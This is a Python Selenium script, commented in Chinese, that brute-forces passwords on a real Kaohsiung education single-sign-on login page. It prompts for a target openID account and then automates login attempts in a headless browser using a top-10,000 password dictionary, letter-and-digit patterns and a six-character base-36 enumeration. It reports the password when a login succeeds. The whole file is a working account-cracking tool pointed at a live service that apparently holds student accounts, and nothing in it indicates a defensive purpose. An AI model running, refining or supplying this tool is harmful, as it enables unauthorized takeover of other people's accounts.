from time import sleep as sl
from selenium import webdriver
from selenium.webdriver.common.by import By

URL = "https://kh.sso.edu.tw/auth-server-stlogin?Auth_Request_RedirectUri=https%253A%252F%252Foidc.tanet.edu.tw%252Fcncreturnpage&Auth_Request_State=a1h8GqiVsrDoNh4wHfqx3IIcWZbx0JrRRDGpc8cGzRk&Auth_Request_Response_Type=code&Auth_Request_Client_ID=cf789350df91c914eede027ce55f3ab5&Auth_Request_Nonce=bKyFuJbbQXulFBTlu3yv5o16-UOKzp4QaK7gfId4Op0&Auth_Request_Scope=openid+exchangedata&local=true"

#region get txt
def get_txt_passwd_efficient():
    """
    高效率讀取密碼字典文件
    返回值：包含所有密碼的列表
    """
    try:
        passwords = []
        with open("passwd-CN-Top10000.txt", "r", encoding='utf-8') as file:
            passwords = [line.strip() for line in file]
        return passwords
    except Exception as e:
        print(f"讀取密碼字典時發生錯誤：{e}")
        return []
#endregion

#region 初始化清單
def init_list():
    try:
        global big_en,small_en,continuous_en,pair_en,math,all_en,fail_list,ignore_below_six,Before_password
        
        Before_password = ""  # 初始化 Before_password
        fail_list = []
        ignore_below_six = False

        # 大寫英文字母列表
        big_en = [
            "A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M",
            "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z"
        ]

        # 小寫英文字母列表
        small_en = [
            "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m",
            "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z"
        ]

        # 連續英文字母列表
        continuous_en = [

            # 三字母重複組合（小寫）
            "aaa", "bbb", "ccc", "ddd", "eee", "fff", "ggg", "hhh", "iii", "jjj",
            "kkk", "lll", "mmm", "nnn", "ooo", "ppp", "qqq", "rrr", "sss", "ttt",
            "uuu", "vvv", "www", "xxx", "yyy", "zzz",

            # 大小寫英文配對
            "Aa", "Bb", "Cc", "Dd", "Ee", "Ff", "Gg", "Hh", "Ii", "Jj", "Kk", "Ll", "Mm",
            "Nn", "Oo", "Pp", "Qq", "Rr", "Ss", "Tt", "Uu", "Vv", "Ww", "Xx", "Yy", "Zz"

            # 三字母重複組合（大寫）
            "AAA", "BBB", "CCC", "DDD", "EEE", "FFF", "GGG", "HHH", "III", "JJJ",
            "KKK", "LLL", "MMM", "NNN", "OOO", "PPP", "QQQ", "RRR", "SSS", "TTT",
            "UUU", "VVV", "WWW", "XXX", "YYY", "ZZZ",

            # 連續字母組合
            "abc", "ABC", "Abc", "abcd", "ABCD", "Abcd", "abcde", "ABCDE", "Abcde",
            "abcdef", "ABCDEF", "Abcdef", "abcdefg", "ABCDEFG", "Abcdefg",
            "abcdefgh", "ABCDEFGH", "Abcdefgh", "abcdefghi", "ABCDEFGHI", "Abcdefghi",
            "abcdefghij", "ABCDEFGHIJ", "Abcdefghij",
        ]

        # 數字列表
        math = [
            # 連續數字 (1-9位數)
            "12", "123", "1234", "12345", "123456", "1234567", "12345678", "123456789",
            "01", "012", "0123", "01234", "012345", "0123456", "01234567", "012345678", "0123456789",

            # 重複數字 (1-6位數)
            "0", "00", "000", "0000", "00000", "000000",
            "1", "11", "111", "1111", "11111", "111111",
            "2", "22", "222", "2222", "22222", "222222",
            "3", "33", "333", "3333", "33333", "333333",
            "4", "44", "444", "4444", "44444", "444444",
            "5", "55", "555", "5555", "55555", "555555",
            "6", "66", "666", "6666", "66666", "666666",
            "7", "77", "777", "7777", "77777", "777777",
            "8", "88", "888", "8888", "88888", "888888",
            "9", "99", "999", "9999", "99999", "999999"
        ]

        print("初始化清單完成")
    except Exception as e:
        print(f"初始化清單時發生錯誤，錯誤{e}")
#endregion

#region 初始化webdriver
def init_selenium():
    try:
        print("初始化web driver完成")
        global driver
        
        # 創建 ChromeOptions 實例
        chrome_options = webdriver.ChromeOptions()
        # 添加 headless 參數
        chrome_options.add_argument('--headless')
        
        # 將 options 傳入 Chrome driver
        driver = webdriver.Chrome(options=chrome_options)
        driver.set_window_size(375, 512)

    except Exception as e:
        print(f"初始化web driver時出現錯誤，錯誤{e}")

    except Exception as e:
        print(f"初始化web driver時出現錯誤，錯誤{e}")

def get_web():
    try:
        driver.get(URL)
        print("開啟網址成功")
    except Exception as e:
        print(f"開啟網址時發生錯誤，錯誤{e}")
#endregion

#region 設定ID
def set_openID():
    try:
        global openID
        openID = input("請輸入將破解密碼的openID帳號：")
        print(f"設定openID為{openID}")
    except Exception as e :
        print(f"設定將破解密碼的openID帳號時發生錯誤{e}")
#endregion

#region 新增設定忽略六位以下的函數
def set_ignore_below_six():
    """設定是否忽略特定位數以下的密碼"""
    try:
        global ignore_below_six, ignore_digit
        while True:
            choice = input("\n是否要忽略特定位數以下的密碼？(y/n)：").lower()
            if choice in ['y', 'n']:
                ignore_below_six = (choice == 'y')
                if ignore_below_six:
                    digit_input = input("請輸入要忽略的位數（直接按Enter則預設為6）：").strip()
                    if digit_input == "":
                        ignore_digit = 6
                    else:
                        try:
                            ignore_digit = int(digit_input)
                        except ValueError:
                            print("輸入無效，使用預設值6")
                            ignore_digit = 6
                    print(f"已設定忽略{ignore_digit}位數以下的密碼")
                else:
                    print("已關閉忽略位數功能")
                return
            print("請輸入 y 或 n")
    except Exception as e:
        print(f"設定忽略位數選項時發生錯誤：{e}")

#endregion

#region 啟動模式
def run_mode(mode):
    """
    根據選擇的模式執行相應的破解邏輯
    參數：
        mode: 選擇的破解模式
    """
    if mode == "base36":
        mode_base36()
    elif mode == "continuous":
        mode_continuous()
    elif mode == "upper":
        mode_upper()
    elif mode == "lower":
        mode_lower()
    elif mode == "weak":
        mode_weak()
    elif mode == "all":
        mode_all()
    else:
        print(f"錯誤：未知的模式 {mode}")
#endregion

#region mode_base36
def mode_base36():
    """
    36進制6位破解模式
    """
    try:
        # 用於轉換數字到字符的列表
        chars = "0123456789abcdefghijklmnopqrstuvwxyz"
        
        # 初始化數字陣列
        number = [0, 0, 0, 0, 0, 0]
        
        while True:
            # 生成當前密碼
            current_password = ''.join(chars[n] for n in number)
            
            # 嘗試當前密碼
            if try_password(current_password):
                return True
            
            # 進位邏輯
            pos = 5  # 從最右邊開始
            while pos >= 0:
                number[pos] += 1
                if number[pos] == 36:  # 需要進位
                    number[pos] = 0
                    pos -= 1  # 移動到左邊一位
                else:
                    break
            
            # 檢查是否已經到達最大值
            if all(x == 36 for x in number):
                return False
                
    except KeyboardInterrupt:
        print("\n程序被手動中斷")
        return False
    except Exception as e:
        print(f"\n執行過程中發生錯誤：{e}")
        return False
    
    return False
#endregion

#region mode_continuous
def mode_continuous():
    """
    常用連續字母破解模式
    """
    try:
        for i in continuous_en:
            for r in math:
                try:
                    if try_password(i+r):
                        return True    
                    sl(0.05)  # 避免請求過快，可調整延遲時間
                
                except Exception as e:
                    print(f"\n嘗試密碼 {i+r} 時發生錯誤：{e}")
                    continue
                    
    except KeyboardInterrupt:
        print("\n程序被手動中斷")
    except Exception as e:
        print(f"\n執行過程中發生錯誤：{e}")
    
    return False
#endregion

#region mode_upper
def mode_upper():
    """
    大寫開頭破解模式
    """
    try:
        for i in big_en:
            for r in math:
                try:
                    if try_password(i+r):
                        return True    
                    sl(0.05)  # 避免請求過快，可調整延遲時間
                
                except Exception as e:
                    print(f"\n嘗試密碼 {i+r} 時發生錯誤：{e}")
                    continue
                    
    except KeyboardInterrupt:
        print("\n程序被手動中斷")
    except Exception as e:
        print(f"\n執行過程中發生錯誤：{e}")
    
    return False
#endregion

#region mode_lower
def mode_lower():
    """
    小寫開頭破解模式
    """
    try:
        for i in small_en:
            for r in math:
                try:
                    if try_password(i+r):
                        return True    
                    sl(0.05)  # 避免請求過快，可調整延遲時間
                
                except Exception as e:
                    print(f"\n嘗試密碼 {i+r} 時發生錯誤：{e}")
                    continue
                    
    except KeyboardInterrupt:
        print("\n程序被手動中斷")
    except Exception as e:
        print(f"\n執行過程中發生錯誤：{e}")
    
    return False
#endregion

#region mode_weak
def mode_weak():
    """
    弱口令字典破解模式
    """
    passwords = get_txt_passwd_efficient()
    if not passwords:
        return
    
    try:
        for password in passwords:
            if try_password(password):
                return True
            sl(0.05)  # 避免請求過快，可調整延遲時間
            
    except KeyboardInterrupt:
        print("\n程序被手動中斷")
    except Exception as e:
        print(f"\n執行過程中發生錯誤：{e}")
    
    return False
#endregion

#region mode_all
def mode_all():
    """
    全模式破解
    """
    # TODO: 實作全模式破解邏輯
    pass
#endregion

#region try password
def try_password(password):
    global Before_password  # 添加全局聲明
    
    # 檢查是否需要忽略特定位數以下的密碼
    if ignore_below_six and len(password.lstrip('0')) < ignore_digit:
        return False
        
    # 最外層尋找登入按鈕
    try:
        # 如果找到按鈕，進行密碼嘗試
        login = driver.find_element(By.ID, "idf")
        try:
            username = driver.find_element(By.NAME, "username")
            passwd = driver.find_element(By.NAME, "password")
            username.clear()
            passwd.clear()
            username.send_keys(openID)
            passwd.send_keys(password)
            # 在點擊前保存當前密碼
            temp_password = Before_password
            Before_password = password
            login.click()
            print(f"password:{password}已嘗試")
            return False
        except:
            # 如果輸入密碼過程出現問題
            print(f"password:{password}嘗試失敗，可能因延遲過長")
            fail_list.append(password)
            return False
    except:
        # 找不到按鈕，表示可能已經登入成功
        print(f"\n登入成功！密碼是：{Before_password}")  # 使用 Before_password 而不是當前密碼
        print("程序結束")
        driver.quit()  # 關閉瀏覽器
        exit()  # 直接結束程式
#endregion

#region 模式選擇
def set_mode():
    try:
        print("\n=== 請選擇破解模式 ===")
        print("1. 36進制6位破解")
        print("2. 常用連續字母破解") 
        print("3. 大寫開頭破解")
        print("4. 小寫開頭破解")
        print("5. 弱口令字典破解")
        print("6. 全模式破解")
        
        while True:
            try:
                choice = int(input("\n請輸入模式編號(1-6)："))
                if 1 <= choice <= 6:
                    if choice == 1:
                        print("已選擇36進制6位破解")
                        return "base36"
                    elif choice == 2:
                        print("已選擇常用連續字母破解")
                        return "continuous"
                    elif choice == 3:
                        print("已選擇大寫開頭破解")
                        return "upper"
                    elif choice == 4:
                        print("已選擇小寫開頭破解")
                        return "lower"
                    elif choice == 5:
                        print("已選擇弱口令字典破解")
                        return "weak"
                    elif choice == 6:
                        print("已選擇全模式破解")
                        return "all"
                else:
                    print("錯誤：請輸入1-6之間的數字!")
            except ValueError:
                print("錯誤：請輸入有效的數字!")
    except Exception as e:
        print(f"設定模式時發生錯誤：{e}")
        return None
#endregion

#region retry fail passwords
def retry_fail_passwords():
    """
    重試之前失敗的密碼列表
    """
    global fail_list
    
    if not fail_list:  # 如果失敗列表為空
        print("沒有需要重試的密碼")
        return False
        
    print(f"\n開始重試失敗的密碼列表，共 {len(fail_list)} 個")
    retry_list = fail_list.copy()  # 創建副本以避免在迭代時修改列表
    fail_list = []  # 清空原列表，為可能的新失敗做準備
    
    try:
        for password in retry_list:
            try:
                if try_password(password):
                    return True
                sl(0.5)  # 重試時使用更長的延遲
                
            except Exception as e:
                print(f"重試密碼 {password} 時發生錯誤：{e}")
                continue
                
    except KeyboardInterrupt:
        print("\n重試過程被手動中斷")
    except Exception as e:
        print(f"\n重試過程中發生錯誤：{e}")
    
    return False
#endregion

#region 主程式
def main():
    global mode
    init_list()
    set_openID()
    mode = set_mode()
    set_ignore_below_six()
    init_selenium()
    get_web()
    
    if mode:
        print(f"\n開始使用{mode}模式進行破解...")
        if run_mode(mode):
            print("成功找到密碼！")
            return
            
        # 在主要模式執行完後進行重試
        print("\n主要嘗試完成，開始重試失敗的密碼...")
        if retry_fail_passwords():
            print("在重試過程中找到密碼！")
        else:
            print("所有嘗試都已完成，未找到正確密碼。")
            print("感謝你的使用")
    else:
        print("模式選擇失敗，程式結束")

if __name__ == "__main__":
    main()
#endregion